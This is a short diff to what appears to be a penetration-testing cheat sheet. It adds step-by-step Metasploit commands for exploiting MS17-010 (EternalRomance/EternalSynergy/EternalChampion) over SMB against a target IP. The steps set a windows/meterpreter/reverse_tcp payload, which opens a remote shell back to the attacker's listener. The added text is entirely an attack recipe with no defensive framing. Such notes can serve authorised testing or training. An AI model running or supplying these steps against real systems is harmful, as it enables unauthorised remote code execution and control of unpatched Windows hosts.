@@ -323,4 +323,15 @@ Go back to listening terminal for meterpreter session
 
 
 
-------
+--MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution--
+
+> msfconsole
+> search romance
+> find eternal romance module and copy it (exploit/windows/smb/ms17_010_psexec)
+> use exploit/windows/smb/ms17_010_psexec
+> show options
+> set lhost local_ip
+> set lport local_port
+> set rhosts target_machine_ip
+> set payload windows/meterpreter/reverse_tcp
+> exploit
